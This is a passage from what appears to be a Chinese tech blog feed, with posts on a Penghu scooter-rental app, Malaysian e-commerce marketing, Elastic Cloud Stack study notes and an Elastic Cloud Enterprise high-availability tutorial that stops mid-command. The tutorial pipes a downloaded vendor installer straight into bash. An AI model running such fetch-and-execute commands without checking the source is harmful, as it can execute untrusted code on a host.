第一次進去的時候竟然沒做導覽功能</li><li>選單每個按下去後沒有直接反應，需要等待許久</li><li>瀏覽站點的圖片用太大解析度，載入圖到可以操作至少超過三秒</li><li>綁定信用卡後不知道要怎麼刪除</li></ul><blockquote><p>格子又小又多真的很有壓力<br><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaRegister.jpg" alt="UrdaRegister"></p></blockquote><blockquote><p><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaLine.jpg" alt="UrdaLine"></p></blockquote><p>App 的部分應該是沒有買業配文，真的很難 google 到 APP 的使用說明跟體驗心得，建議在改善之後，可以找當地的民宿或部落客合作。</p><h2 id="實體機車體驗"><a href="#實體機車體驗" class="headerlink" title="實體機車體驗"></a>實體機車體驗</h2><p>貼紙的標示這麼大版面，結果也不留一下 line 的即時客服 QR code 或是疑難排解 FAQ，都已經在車上了還需要這些說明嗎?</p><blockquote><p>覺得少了公司表現最好的部分<br><img src="/2020/10/19/thinking-urda-app-user-experience/BadGuide.jpg" alt="BadGuide"></p></blockquote><p>這個公司唯一推薦是 Line 的即時客服，只有在場站的時候有加入的 QR code 可以掃，真的很還好我有先加入，解決問題跟回覆的速度都很快，真的很感謝你們。</p><blockquote><p>那個 QR code 請大家一定要記得加<br><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaStationIntroduction.jpg" alt="UrdaStationIntroduction.jpg"></p></blockquote><p>車子本身如果沒有遇到什麼問題，騎乘上還算不錯，雙載的話催到底就是 60 左右，安全帽都有附帽套很棒。</p><p>場站密度的部分以我的步行尺度覺得算夠多了，大部分都在知名景點附近，第一次到澎湖自由行的話覺得還算可以，如果只有騎短暫的時間算是非常推薦。</p><p>但，還是會遇到有點問題的車子，就讓我們來看下去，第一次租車就拋錨，最後也沒給我們任何 coupon 補貼，只有說到修好為止不算錢，浪費了我跟同學的一小時，這部份真的有點靠北。</p><blockquote><p>真的是傻眼<br><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaBad.JPG" alt="UrdaBad"></p></blockquote><p>然後就是出門也要當帝爸狗的生活，大家要學會看燈號變化，敘述情境的時候盡可能把時間、操作步驟都列清楚，對方的客服跟工程師才有辦法查詢或還原真相。</p><blockquote><p>燈號閃爍的方式算是關鍵<br><img src="/2020/10/19/thinking-urda-app-user-experience/BadGuide.jpg" alt="BadGuide"><br><img src="/2020/10/19/thinking-urda-app-user-experience/UrdaStationIntroduction.jpg" alt="UrdaStationIntroduction.jpg"></p></blockquote><p>最後我們成功遇到了兩種問題，且從頭到尾都沒進行修正</p><ul><li>車子油門線故障，造成重啟後騎一小段就會被鎖死，維修人員來之後就是一直幫我們搖晃油門線，晃到正常為止，說如果要修理的話要去機車行調一下油門間隙，因為他沒有帶工具來，請我們自己去機車行，所以來這裡是單純來哈囉的部分? 而且，乾，我們要怎麼去? 我真的差點說 X 你 X，不過職場的歷練讓我展現成熟度，竟然回答出好的，我理解，那客服或是你這邊還能怎麼幫我們? 這裡是荒郊野外，這台車目前就是不能騎，你等一下又要急著趕回台灣?<blockquote><p>運氣很好，維修人員就是大力搖晃到可以暫時騎一段時間，希望不要有可憐的孩子騎到這台<br><img src="/2020/10/19/thinking-urda-app-user-experience/ThrottleCable.jpg" alt="ThrottleCable"></p></blockquote></li><li>坐墊按鈕故障，撐到附近場站換車之後換到一個較新電池較大的車，但按鈕故障，不過因為按鈕只是觸發連桿，維修人員有提供手動開啟的方式，因為維修人員要準備回台灣了 Orz (聽起來是兩地跑，顧個當地機車行兼職人員不好嗎? 喔，差點忘記這間公司沒錢請工程師，所以很可能也沒錢請維修人員 QQ<blockquote><p>外面按鈕其實裝飾用，重點是驅動底下的連桿，所以也可以用手拉<br><img src="/2020/10/19/thinking-urda-app-user-experience/StorageBox.jpg" alt="StorageBox"></p></blockquote></li></ul><p>如果認為自己不會遇到車王，個人是還蠻推薦的，記得租車的話距離不遠可以租電量一半以下的，至少代表有人騎過 XDDD</p>]]></content>
      
      
      <categories>
          
          <category> 產業觀察 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 產業觀察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>淺談 Product Marketing</title>
      <link href="/2020/10/06/thinking-product-marketing-malaya/"/>
      <url>/2020/10/06/thinking-product-marketing-malaya/</url>
      
        <content type="html"><![CDATA[<p>這篇文章是聽了以下兩場線上直播分享後的筆記，關於 Product Marketing 及電商在馬來西亞的狀況。</p><ul><li><a href="https://www.facebook.com/AnyaChengSanFrancisco/videos/620578305320996">行銷科技新常態 - 矽谷阿雅＋林思吾 台灣矽谷連線</a></li><li><a href="https://www.facebook.com/1498922743698823/videos/355874962099702">跨境電商好賺嗎？馬來西亞大前輩帶你飛！｜ 91APP 跨境電商直播</a></li></ul><p>台灣是代工王國，大多習慣對企業做銷售，對畢業生來說最高薪的產業集中在 IC 設計、半導體產業，像是設計和製造處理器也是屬於 B2B2C，就算網路業就某個角度來看其實也只是網路代工，在台灣可能要到一些外商公司才比較有對用戶直接行銷的概念。</p><p>學校以解決問題導向來培養學生，培養出很多優秀的工程師，但做為工程師往往很少有機會接觸和理解消費者行為，會比較難知道該怎麼做出一個適合消費者的產品，而定位產品或產品營銷屬於問題導向是問問題的過程。</p><h2 id="產品營銷-Product-Marketing"><a href="#產品營銷-Product-Marketing" class="headerlink" title="產品營銷 (Product Marketing)"></a>產品營銷 (Product Marketing)</h2><p>產品營銷是向客戶推銷產品的過程，在產品上市後通常會有三個步驟:</p><ol><li><p>了解用戶需要 (Consumer Inside)</p><ul><li>用戶上的需要</li><li>市場上的需要，消費者是否願意付錢</li></ul></li><li><p>市場定位 (Go to Market、Positioning)</p><ul><li>著重在對商品的理解</li><li>一樣的產品有不同定位，就會有不同行銷方法<ul><li>不塞車地圖的導航演算法，在印度就會是騎車不塞車、在美國則是開車不塞車</li><li>同樣是殺蟲劑的命名可能會影響購買意願</li></ul></li></ul></li><li><p>第一次產品行銷</p><ul><li>目的是測試什麼是 Work 的</li><li>訂出一個 Playbook 然後給全世界的行銷團隊一起 Follow</li></ul></li></ol><h2 id="產品營銷趨勢-Marketing-Trend"><a href="#產品營銷趨勢-Marketing-Trend" class="headerlink" title="產品營銷趨勢 (Marketing Trend)"></a>產品營銷趨勢 (Marketing Trend)</h2><p>GDPR 的影響</p><ul><li>GDPR 之前，是基於對使用者的理解，透過使用者的相關背景去推薦適合的商品</li><li>GDPR 之後，在登入之前無法知道任何資訊，會偏向從商品出發，基於對商品的理解去做最好的商品組合推薦，但在使用者登入之後，仍然可以整合實體商店的銷售紀錄，去做使用者的追蹤</li></ul><p>庫存的處理</p><ul><li>零售是透過薄利去銷售庫存</li><li>電商透過了解客戶及增加轉換率，透過行銷來提高產品價值</li></ul><p>行銷通路，要賣給誰、要怎麼賣、要透過什麼內容</p><ul><li>通路的網路化，直接可以對到消費者，Facebook 或是 Google 廣告想停就停</li><li>疫情時代的實體行銷較弱，因為疫情不確定性高</li><li>獨立世代崛起，個性化，像是把 banner 分成三類</li></ul><blockquote><p>Q: Nike 怎麼從 B2B 變成 B2C? 早期主要都是賣給 Foot Locker</p></blockquote><h2 id="馬來西亞使用者觀察-Comsumer-Indside"><a href="#馬來西亞使用者觀察-Comsumer-Indside" class="headerlink" title="馬來西亞使用者觀察 (Comsumer Indside)"></a>馬來西亞使用者觀察 (Comsumer Indside)</h2><p>人口約 3200 萬，有 81% 會使用社群媒體，比起去年成長 +4.1% +100 萬</p><ul><li>電商規模每年成長 20%</li><li>具有消費力的青壯年 (16~64) 68%</li><li>社群使用年成長 +9.2%</li><li>FB 2200 萬可觸及占比 86%</li><li>IG 1200 萬可觸及占比 47%</li></ul><p>網路與社群軟體使用時間</p><ul><li>平均上網時間 7H57M</li><li>平均手機使用時間 4H03M</li><li>平均逛社群的時間 2H45M</li></ul><p>網紅分類</p><ul><li>素人 2k~10k</li><li>微網紅 10k~50k</li><li>中大型 50k~300k</li><li>明星 300k</li></ul><p>了解台灣商品在當地商品賣得好的原因</p><ul><li>華人佔比 20%: 花雕雞麵、滿漢大餐銷量高</li><li>流行時尚: 我的美麗日記</li></ul><p>馬來西亞消費習慣</p><ul><li>當地人步調較慢</li><li>大部分消費用手機完成: APP 74% vs Web 26%</li><li>習慣用即時客服</li></ul><p>可能的策略</p><ul><li>推播開箱影片、直播集客</li><li>馬來西亞網路不穩，手機 APP 比較順</li><li>分階段免運、運費折扣、折價券</li><li>新舊客分眾發優惠券</li></ul><p>可能的發展階段</p><ul><li>線上微網紅、品牌官網、APP</li><li>百貨小櫃位、吸引加入線上會員、線上推廣到實體體驗</li><li>當地通路、電視節目、中大型網紅</li><li>官網吸引新客人 + APP 經營舊客人</li></ul><p>參考資料</p><ul><li><a href="https://blog.shopline.tw/2019-cross-border-ecommerce-malaysia/">https://blog.shopline.tw/2019-cross-border-ecommerce-malaysia/</a></li><li><a href="https://www.91app.com/blog/malaysia-cross-border-ecom/">https://www.91app.com/blog/malaysia-cross-border-ecom/</a></li></ul><iframe src="//www.slideshare.net/slideshow/embed_code/key/5rnqPFsEeL1ABh" width="595" height="485" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/DataReportal/digital-2020-malaysia-january-2020-v01" title="Digital 2020 Malaysia (January 2020) v01" target="_blank">Digital 2020 Malaysia (January 2020) v01</a> </strong> from <strong><a href="//www.slideshare.net/DataReportal" target="_blank">DataReportal</a></strong></div>]]></content>
      
      
      <categories>
          
          <category> 產業觀察 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 產業觀察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>開外掛的 Elasticsearch 數據檢索</title>
      <link href="/2020/09/30/elastic-cloud-stack-101/"/>
      <url>/2020/09/30/elastic-cloud-stack-101/</url>
      
        <content type="html"><![CDATA[<p>什麼是 ELK Stack? Elastic 加入了開源的相關周邊後，進化成 Elastic Stack (ELK Stack) 主要包含 Elasticsearch、Kibana、Logstash (選配) or Beats，接下來會分享花 30 天入門 Elastic Cloud Stack 相關服務的心得，這次的學習將會以 Elastic Cloud 上的操作為主。</p><h2 id="心得分享"><a href="#心得分享" class="headerlink" title="心得分享"></a>心得分享</h2><p>我的背景是前端工程師，從零開始接觸入門 Elastic Cloud Stack 30 天。曾聽過兩次 Elasticsearch 業界日常使用分享，第一次接觸檢索是以前在 GIS 公司服務，當時架完以下服務後算是對全文檢索有基本概念。以下小編過往工作和學習經驗</p><ul><li>工作: 前後端開發六年多<ul><li>75% 前端，主要是 React.js 的相關應用</li><li>20% 後端，Node.js 為主、也有架設過 Java 的後端服務<ul><li>PostgreSQL 搭配 PostGIS 實作地理資訊檢索</li><li>Solr 架設全文檢索引擎，檢索全台景點相關資料</li></ul></li><li>5% 伺服器，Linux 為主、相關雲端服務的使用</li></ul></li><li>碩士: 學習研究方法，在短時間學習科技最尖端的新事物<ul><li>資料結構、離散數學助教</li><li>Android App 開發，跟厲害學弟實做成大醫院室內導航，但後來影像辨識部分不太成功</li><li>碩論實做簡單的前後端網站應用透過 UTAUT 分析，題目是<a href="https://www.slideshare.net/ssuser2bece7/ss-154311857">群眾外包應用於藥物服用知識系統之研究</a>，<a href="http://140.116.207.88/etdservice/view_metadata?etdun=U0026-1408201316260900&query_field1=all&query_word1=%E6%9E%97%E5%BD%A5%E6%88%90">電子全文</a>成大在畢業當年就提供下載了，歡迎朝聖 :)</li></ul></li><li>大學: 綜合型大學，主修是地方與人文美食?!!<ul><li>工程科學系畢業，上過大部分 Computer Science 相關基礎課程</li><li>大學專題做的是嵌入式系統</li></ul></li></ul><p>本來預計全文檢索相關應用可以輕鬆學，30 天也許還能做個小專案應用，結果發現功能豐富，每天抽空 2~3 小時學習、組織、規劃、寫作的話，30 天還蠻剛好的，要做小專案可能要有更充裕的時間。</p><p>Elastic Cloud Stack 以 Elasticsearch 為基礎，簡化了在<a href="#Elastic-Cloud-Logging">日誌 (Log)</a>、<a href="#Elastic-Cloud-Metrics">指標 (Metrics)</a>、<a href="#Elastic-Cloud-APM">應用程式效能監控 (APM)</a> 資料蒐集與分析的流程，並且提供了 Kibana 這個網頁版的 GUI 介面方便對 Elasticsearch 進行相關操作。</p><p>只想會使用也提供了兩款幾乎是開箱即用的 <a href="#Elastic-Cloud-Search-APP">Search APP</a>，分別是 Workplace Search、App Search，設定好資料來源就完成 80%，對一個<strong>前端工程師</strong>來說，想要快速實做 MVP 來試水溫這個部分非常方便。</p><p>對<strong>負責維運的 IT 部門</strong>來說<a href="#Elastic-Cloud-Security">資訊安全</a>就蠻重要的，2019 Elastic 宣布買下終端安全資安業者 Endgame，宣示了往端點 (Agent-Based) 安全應用發展的決心，所以以 Elasticsearch 為基礎的 SIEM 整合 Endgame 後就發展成了一套還算完整的端點防護產品。</p><p>對於<strong>整個後端團隊</strong>來說，需要應用在正式環境，<a href="#Elastic-Cloud-Enterprise">Elastic Cloud Enterprise</a> 提供了 Cloud UI 管理介面，大量簡化維運、擴充與初步問題排解的難度，節點的監控也都幾乎開箱即用，即便最後不使用 ECE 原來的 <a href="#Elastic-Stack-Kibana">Kibana</a> 也有很豐富<del>(複雜)</del>的功能，只是需要花<del>(不只)</del>一點心力把結果變成想要的樣子，甚拉出一套 GA 儀表板都沒有問題。</p><p>這次學習是照 Elastic Cloud 提供的<a href="https://www.elastic.co/training/">免費訓練</a>總共兩大塊 17 門課，最後完成 16 門。建議學習的順序是做完 Quick Start 之後就先讀相關的基礎知識，打鐵趁熱較不會一知半解，底下會列出我認為比較好的學習與歸類，當然，還有之前寫的文章。</p><h2 id="Elastic-Stack-Elasticsearch"><a href="#Elastic-Stack-Elasticsearch" class="headerlink" title="Elastic Stack: Elasticsearch"></a>Elastic Stack: Elasticsearch</h2><p>Elasticsearch 是一個及時分散式的資料庫兼檢索引擎，並提供 REST API 方便大家操作，可以用在任何需要把資料儲存並快速進行全文檢索的地方，什麼時候可以用到檢索，一個搜尋引擎執行的目標就是優化查詢的速度，讓我們快速找到某個單詞或句子在文檔中出現的地方，過往經驗覺得比較適合的地方像是:</p><ul><li>GIS 資料</li><li>各種地方蒐集的 log</li><li>電商的產品分類、價格、關鍵字搜尋 (不用直接操作關聯資料庫減少負擔)</li></ul><p>有三種使用方法:</p><ul><li>本機安裝: Java Base 所以如果想要安裝在本機上就需要先準備相關的環境</li><li>使用 Elastic Cloud</li><li>AWS、GCP 上的免費版 (Open Source 版本)</li></ul><p>服務主要分成底下兩種:</p><ul><li>App Search: 匯入資料 csv、JSON 等資料</li><li>Workplace Search: 整合第三方資料來源<ul><li>Confluence Cloud</li><li>Confluence Server</li><li><a href="https://www.elastic.co/guide/en/workplace-search/current/workplace-search-github-connector.html">GitHub</a></li><li><a href="https://www.elastic.co/guide/en/workplace-search/current/workplace-search-google-drive-connector.html">Google Drive</a></li><li><a href="https://www.elastic.co/guide/en/workplace-search/current/workplace-search-dropbox-connector.html">Dropbox</a></li><li>Jira Cloud</li><li>Jira Server</li><li>OneDrive</li><li>Salesforce</li><li>ServiceNowSharePoint Online</li><li>Zendesk</li></ul></li></ul><h3 id="全文檢索"><a href="#全文檢索" class="headerlink" title="全文檢索"></a>全文檢索</h3><p>之前有寫過一篇文簡單介紹了<a href="/2018/04/06/tool-fulltext-search/">全文檢索的概念</a>與應用，這裡簡單比較用一般資料庫與 Elastic Search 實作全文檢索服務的差異。</p><p>一般資料庫:</p><ul><li>對資料庫下命令 Like 或是配置資料庫內建的全文檢索</li><li>寫程式串接</li><li>撰寫 API 供他人使用</li><li>撰寫 Client 端</li><li>需要相關背景知識進行效能調整</li></ul><p>Elastic Search:</p><ul><li>可以都透過 REST API 做相關操作、不需要對資料庫下命令</li><li>有現成的 <a href="https://github.com/elastic/app-search-javascript">App Search Client</a> 可以套用</li><li>系統自動透過反向索引增進效能</li></ul><h2 id="Elastic-Stack-Kibana"><a href="#Elastic-Stack-Kibana" class="headerlink" title="Elastic Stack: Kibana"></a>Elastic Stack: Kibana</h2><p>Kibana 是一個搭配 Elasticsearch 使用的使用者介面兼資料視覺化工具:</p><ul><li>是一個開源的資料分析與視覺化平台，方便瀏覽 Elasticsearch 的資料並且製作圖表、Dashboard</li><li>是一個 Elastic Stack 的管理介面，像是安全性設定、使用者腳色、快照備份等等</li><li>是一個傳送門，像是透過 log 的分析就可以做到 Elastic 解決方案中的資訊安全事件管理 (SIEM)</li></ul><h2 id="Elastic-Stack-Logstash-or-Beats"><a href="#Elastic-Stack-Logstash-or-Beats" class="headerlink" title="Elastic Stack: Logstash or Beats"></a>Elastic Stack: Logstash or Beats</h2><ul><li>Beats 是數據的蒐集工具，透過模組直接送數據到 Elasticsearch 或 Logstash</li><li>Logstash 是資料處理的工具，能夠同時蒐集多個來源，統整轉換後再送進 Elasticsearch</li></ul><h2 id="Elastic-Cloud-學習資源與分類"><a href="#Elastic-Cloud-學習資源與分類" class="headerlink" title="Elastic Cloud 學習資源與分類"></a>Elastic Cloud 學習資源與分類</h2><p>這次的學習將會以試用 Elastic Cloud 為主，接下來的 30 天將一步步的依照官方提供的<a href="https://www.elastic.co/training/free#quick-starts">一系列訓練教學文</a>做過一遍，帶著大家一起入門。Elastic Cloud Stack 的相關教學主要會分成兩塊:</p><ol><li>Quick Starts</li></ol><ul><li>Logging Quick Start</li><li>Metrics Quick Start</li><li>Application Performance Monitoring (APM) Quick Start</li><li>Workplace Search Quick Start</li><li>App Search Quick Start</li></ul><ol start="2"><li>Fundamentals Training</li></ol><ul><li>Observability Fundamentals</li><li>Introduction to Observability: Logging</li><li>Metrics Fundamentals</li><li>APM Fundamentals</li><li>Kibana Fundamentals</li><li>Kibana for Splunk Users</li><li>Fundamentals of Securing Elasticsearch</li><li>Elastic SIEM Fundamentals</li><li>Elastic Endpoint Security Fundamentals</li><li>Anomaly Detection for Cybersecurity</li><li>ECE Fundamentals</li></ul><p>按照分類區分的話，會分成七大塊</p><ol><li>Logging</li><li>Metrics</li><li>APM</li><li>Kibana</li><li>Search APP</li><li>Security</li><li>Elastic Cloud Enterprise</li></ol><h3 id="Elastic-Cloud-Logging"><a href="#Elastic-Cloud-Logging" class="headerlink" title="Elastic Cloud Logging"></a>Elastic Cloud Logging</h3><ul><li><a href="/2020/09/02/elastic-logging-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Logging Quick Start</a>: 示範如何安裝並使用 Filebeat 傳送 Nginx Access Log 到 Elasticsearch 中，並使用 Kibana 即時監看相關資料</li><li><a href="/2020/09/09/elastic-observability-logging-introduction/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Introduction to Observability: Logging</a>: 更深入的去介紹 Log 與 Filebeat 在實際運用上的細節、基礎概念及相關配置教學，本篇文章將著重在 Filebeat 在收集 Log 上的運用</li></ul><h3 id="Elastic-Cloud-Metrics"><a href="#Elastic-Cloud-Metrics" class="headerlink" title="Elastic Cloud Metrics"></a>Elastic Cloud Metrics</h3><ul><li><a href="/2020/09/03/elastic-metrics-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Metrics Quick Start</a>: 示範如何安裝並使用 Metricbeat 傳送 Nginx 伺服器狀態到 Elasticsearch 中，並使用 Kibana 即時監控相關資料</li></ul><h3 id="Elastic-Cloud-APM"><a href="#Elastic-Cloud-APM" class="headerlink" title="Elastic Cloud APM"></a>Elastic Cloud APM</h3><ul><li><a href="/2020/09/12/elastic-apm-fundamentals/?utm_source=link&utm_medium=article&utm_campaign=internal_link">APM Fundamentals</a>: 簡介怎麼運用 APM client 和 server 端的函式庫來做應用程式層級的監控</li></ul><h3 id="Elastic-Cloud-Kibana"><a href="#Elastic-Cloud-Kibana" class="headerlink" title="Elastic Cloud Kibana"></a>Elastic Cloud Kibana</h3><ul><li>Kibana Fundamentals<ul><li><a href="/2020/09/10/elastic-kibana-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">簡介 Kibana 並帶著大家一起第一次使用 Kibana 就上手，把資料視覺化</a></li><li><a href="/2020/09/21/elastic-machine-learning-fundamentals/?utm_source=link&utm_medium=article&utm_campaign=internal_link">機器學習的名詞、相關流程與案例介紹</a></li></ul></li><li>Kibana for Splunk Users: 沒碰過 Splunk 可以跟小編一樣先跳過</li></ul><h3 id="Elastic-Cloud-Search-APP"><a href="#Elastic-Cloud-Search-APP" class="headerlink" title="Elastic Cloud Search APP"></a>Elastic Cloud Search APP</h3><ul><li><a href="/2020/09/06/elastic-app-search-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">App Search Quick Start</a>: 示範如何使用 Elastic App Search，App Search 是一個全文檢索的引擎，使用 Elastic Cloud 服務可以在幾分鐘內完成搜尋引擎的所有相關設定與資料匯入</li><li><a href="/2020/09/08/elastic-workplace-search-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Workplace Search Quick Start</a>: 示範如何使用 Elastic Workplace Search (工作區檢索)，工作區檢索讓我們能夠匯入並整合第三方服務的資料到搜尋引擎中，像是 Google Drive、Dropbox 等等，使用 Elastic Cloud 服務可以在幾分鐘內完成所有相關設定與資料匯入</li></ul><h3 id="Elastic-Cloud-Security"><a href="#Elastic-Cloud-Security" class="headerlink" title="Elastic Cloud Security"></a>Elastic Cloud Security</h3><ul><li>Fundamentals of Securing Elasticsearch<ul><li><a href="/2020/09/13/elastic-security-role-based-access-control/?utm_source=link&utm_medium=article&utm_campaign=internal_link">操作權限管理 (Role-Based Access Control)</a></li><li><a href="/2020/09/14/elastic-secure-communications/?utm_source=link&utm_medium=article&utm_campaign=internal_link">加密傳輸</a></li></ul></li><li>Elastic SIEM Fundamentals<ul><li><a href="/2020/09/16/elastic-security-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">透過 Kibana 介面加入並監控安全相關的事件數據</a></li><li><a href="/2020/09/18/elastic-siem-ui/?utm_source=link&utm_medium=article&utm_campaign=internal_link">SIEM UI 與功能介紹</a></li></ul></li><li>Elastic Endpoint Security Fundamentals<ul><li><a href="/2020/09/15/elastic-endpoint-security/?utm_source=link&utm_medium=article&utm_campaign=internal_link">淺談端點安全、EDR、SIEM、Elastic Endpoint Security 的基礎概念</a></li></ul></li><li>Anomaly Detection for Cybersecurity<ul><li><a href="/2020/09/17/elastic-endpoint-security-application/?utm_source=link&utm_medium=article&utm_campaign=internal_link">端點防護產品 Endgame 的體驗心得分享</a></li><li><a href="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/?utm_source=link&utm_medium=article&utm_campaign=internal_link">DNS 常見攻擊與可能的偵測方法</a></li></ul></li></ul><h3 id="Elastic-Cloud-Enterprise"><a href="#Elastic-Cloud-Enterprise" class="headerlink" title="Elastic Cloud Enterprise"></a>Elastic Cloud Enterprise</h3><ul><li>ECE Fundamentals<ul><li><a href="/2020/09/23/elastic-cloud-enterprise-architecture/?utm_source=link&utm_medium=article&utm_campaign=internal_link">系統平台管理與架構設定</a></li><li><a href="/2020/09/24/elastic-cloud-enterprise-deployments/?utm_source=link&utm_medium=article&utm_campaign=internal_link">開箱及部屬樣板體驗心得分享</a></li><li><a href="/2020/09/25/elastic-cloud-snapshots/?utm_source=link&utm_medium=article&utm_campaign=internal_link">雲端資料備份與恢復</a></li></ul></li><li>Installing and Scaling ECE<ul><li><a href="/2020/09/27/elastic-cloud-high-availability/?utm_source=link&utm_medium=article&utm_campaign=internal_link">配置高可用性的系統架構</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Cloud Enterprise 維運與除錯</title>
      <link href="/2020/09/27/elastic-cloud-high-availability/"/>
      <url>/2020/09/27/elastic-cloud-high-availability/</url>
      
        <content type="html"><![CDATA[<h2 id="Elastic-Cloud-Enterprise-維運與除錯"><a href="#Elastic-Cloud-Enterprise-維運與除錯" class="headerlink" title="Elastic Cloud Enterprise 維運與除錯"></a>Elastic Cloud Enterprise 維運與除錯</h2><p>這篇文章會示範如何透過 Elastic Cloud Enterprise 配置高可用性 (High Availability) 的系統架構，透過架構設計來消除單點故障的影響來提升網站的可靠性。除錯其實就是維運團隊的日常任務，當然有些公司的維運可能只會</p><ul><li>重開虛擬機加重啟服務</li><li>寄信然後跟主管一起用嘴高光負責的 RD</li></ul><p>不過一個稱職的維運通常可能還會給力的幫忙</p><ul><li>幫忙上補釘或是緊急修復系統異常</li><li>日常的系統底層服務或軟體更新</li><li>協助啟用新的附加功能，譬如加密傳輸</li></ul><h3 id="ECE-基本維運除錯"><a href="#ECE-基本維運除錯" class="headerlink" title="ECE 基本維運除錯"></a>ECE 基本維運除錯</h3><p>ECE 目前體驗下來的心得是有好用方便的 UI，而且透過 Docker 容器化的配置也解決了一部分早期分散式系統會遇到的多租戶 (Multi-Tenancy)、腦裂 (split brain) 等等關於實體資源分配搶奪的問題，缺點大概就是目前還沒有 logstash? 不過這次 30 天體驗也沒怎麼使用到，其實大多狀況看起來也都可以處理得很好?</p><p>接下來會示範怎麼在不影響原來的服務的前提下，怎麼安全的去維護 ECE 中的元件服務。透過 Cloud UI 的介面，可以初步方便簡單觀察各個服務叢集目前的狀況，符號會有三種顏色，綠色正常、黃色警告、紅色不正常。</p><blockquote><p>符號會有三種顏色，綠色正常、黃色警告、紅色不正常<br><img src="/2020/09/27/elastic-cloud-high-availability/DeployHealth.JPG" alt="DeployHealth"></p></blockquote><p>正常在做維護或除錯的時候，理論上不應該影響原來系統的運行，會影響的話現在的 SA&#x2F;SD 就應該去撞豆腐了? 接下來的示範中目前有三個可用區域，假設我們今天要進行第二個可用區域的相關維護。</p><p>第一個步驟進到 Allocators 選單找到第二個可用區域並啟動維護模式。</p><blockquote><p>Allocators 選擇 zone 2 進行維護<br><img src="/2020/09/27/elastic-cloud-high-availability/Maintenance.JPG" alt="Maintenance"></p></blockquote><p>啟動後會發現只有一個服務節點是只存在這個可用區域，這就是這次要移動的對象，有兩個 zone 以上的不需要移動，因為會有 Tiebreakers 幫忙自動做 HA，所以在真的停機之後會影響的就是這個節點的服務。</p><blockquote><p>找出在這個可用區域且只有 1 zone 的服務<br><img src="/2020/09/27/elastic-cloud-high-availability/EnableMaintenanceMode.JPG" alt="EnableMaintenanceMode"></p></blockquote><blockquote><p>嘗試進行移動<br><img src="/2020/09/27/elastic-cloud-high-availability/MoveNode.JPG" alt="MoveNode"></p></blockquote><blockquote><p>移動的時候可能會發現一點小問題<br><img src="/2020/09/27/elastic-cloud-high-availability/Error.JPG" alt="Error"></p></blockquote><blockquote><p>會發現是沒有對應的可用區域可以移動，這邊就先簡單修改 Tag，把 highCPU 改成 false 就可以移動了<br><img src="/2020/09/27/elastic-cloud-high-availability/ModifyTags.JPG" alt="ModifyTags"></p></blockquote><blockquote><p>移動完成後假裝進行維護，把 Docker 停掉並重開機<br><img src="/2020/09/27/elastic-cloud-high-availability/PerformedMaintenance.JPG" alt="PerformedMaintenance"></p></blockquote><blockquote><p>會發現可用區域就不見了<br><img src="/2020/09/27/elastic-cloud-high-availability/PerformedMaintenanceZone2.JPG" alt="PerformedMaintenanceZone2"></p></blockquote><blockquote><p>等重開機完成後啟用 Docker 取消維護服務後，Tiebreakers 會自動讓節點服務恢復，收工 🎉🎉🎉<br><img src="/2020/09/27/elastic-cloud-high-availability/Success.JPG" alt="Success"></p></blockquote><h3 id="High-Availability"><a href="#High-Availability" class="headerlink" title="High Availability"></a>High Availability</h3><p>ECE 的高可用性主要是透過可用區域 (availability zones) 來做到容錯與高可用性的，可用區域可以是任何雲端或是實體機台，每個區域皆由一或多個配備獨立電力、冷卻系統及網路的資料中心所組成，且不被其他區域的狀況影響，像是如果地震導致台北區停機，東京區系統應該還是要維持正常。</p><h4 id="ECE-配置可用區域"><a href="#ECE-配置可用區域" class="headerlink" title="ECE 配置可用區域"></a>ECE 配置可用區域</h4><p>安裝時透過 <code>--availability-zone</code> 這個指令來加入可用區域，安裝步驟如下:</p><p>安裝第一台，跟之前一樣安裝完之後會有帳號、密碼還有 token 相關訊息，記得存好，指定 <code>--availability-zone myzone1</code>。</p><p><code>bash &lt;(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install --cloud-enterprise-version 2.1.1 --availability-zone myzone1</code></p><blockquote><p>安裝第一台成功的訊息<br><img src="/2020/09/27/elastic-cloud-high-availability/HAInstallSuccess.JPG" alt="HAInstallSuccess"></p></blockquote><blockquote><p>安裝第一台成功<br><img src="/2020/09/27/elastic-cloud-high-availability/HAZoneOne.JPG" alt="HAZoneOne"></p></blockquote><p>安裝第二台，會用到剛剛安裝成功得到的 token，剛剛存下來的訊息也有提醒我們要記得去設定角色，指定 <code>--availability-zone myzone2</code>，安裝完成後透過 GUI 設定相關的 role。</p><p><code>bash &lt;(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install --cloud-enterprise-version 2.1.1 --availability-zone myzone2 --roles allocator --coordinator-host &lt;IP&gt; --roles-token &lt;TOKEN&gt;</code></p><blockquote><p>安裝第二台成功<br><img src="/2020/09/27/elastic-cloud-high-availability/HAZoneTwo.JPG" alt="HAZoneTwo"></p></blockquote><blockquote><p>透過 Cloud UI Runners 去幫新的 Runner 配置角色<br><img src="/2020/09/27/elastic-cloud-high-availability/HARunners.JPG" alt="HARunners"></p></blockquote><blockquote><p>直接全部勾選<br><img src="/2020/09/27/elastic-cloud-high-availability/HARunnersUpdateRoles.JPG" alt="HARunnersUpdateRoles"></p></blockquote><p>安裝第三台，如果想先指定相關的 role，可以透過指令在第一台先產生特定 token: <code>curl -k -H &#39;Content-Type: application/json&#39; 